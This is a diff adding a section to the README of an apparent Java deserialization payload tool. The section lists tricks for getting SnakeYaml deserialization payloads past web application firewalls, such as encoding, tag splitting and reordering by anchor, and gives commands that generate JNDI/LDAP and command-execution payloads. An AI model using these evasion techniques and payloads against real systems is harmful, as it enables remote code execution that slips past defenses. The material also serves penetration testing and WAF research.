@@ -1390,6 +1390,26 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 -m SnakeYamlAttack -g JdbcRowSetImpl -a "ldap://127.0.0.1:1389/" -waf-bypass "classNameURLEncode"
 ```
 
+4. 多种方式集合绕WAF，学习自：[spel注入和snakeyaml反序列化waf bypass trick](https://liotree.github.io/2025/02/09/spel%E6%B3%A8%E5%85%A5%E5%92%8Csnakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96waf%20bypass%20trick/)
+
+1. 双引号中可以使用unicode和hex编码
+2. 标签（也就是类名）的位置可以多一层url编码
+3. 通过标签的拼接避免`!!`的使用以及拆分恶意类名，这个是[SnakeYaml 反序列化的一个小 trick](https://mp.weixin.qq.com/s/2i6Q9Ob7n0cSxuj9Rob8Uw#at)
+4. 利用多个`java.lang.Character`构造`com.sun.xml.internal.fastinfoset.util.CharArray`，再实例化`java.lang.StringBuilder`和`java.lang.String`，达到拆分字符串的效果。但是这种组合而成sequence不能用在key的位置（也就是属性名），只能用在具体属性值的地方，可以用来绕过一些对`ldap://` `rmi://`的检测。
+5. 一些waf的检测规则会指定不同字段之间顺序，可以使用yaml的alias和anchor功能（`&`和`*`）来改变顺序。
+
+工具：对于多种方式绕waf，目前ysoSimple工具集成前4个。MixObf模式适配Payload比较好的是下面四个。其余Payload适配的不太好，后面有时间再修改
+
+```bash
+-m SnakeYamlAttack -g JdbcRowSetImpl -a "ldap://127.0.0.1:1389/" -waf-bypass "MixObf"
+
+-m SnakeYamlAttack -g C3P0_JNDI -a "ldap://127.0.0.1:1389/" -waf-bypass "MixObf"
+
+-m SnakeYamlAttack -g C3P0_Yso -a "FastJson1:Templateslmpl:auto_cmd:calc" -waf-bypass "MixObf"
+```
+
+#### 
+
 #### writeToFile 写入到文件
 
 描述：将生成的Payload写入到文件中
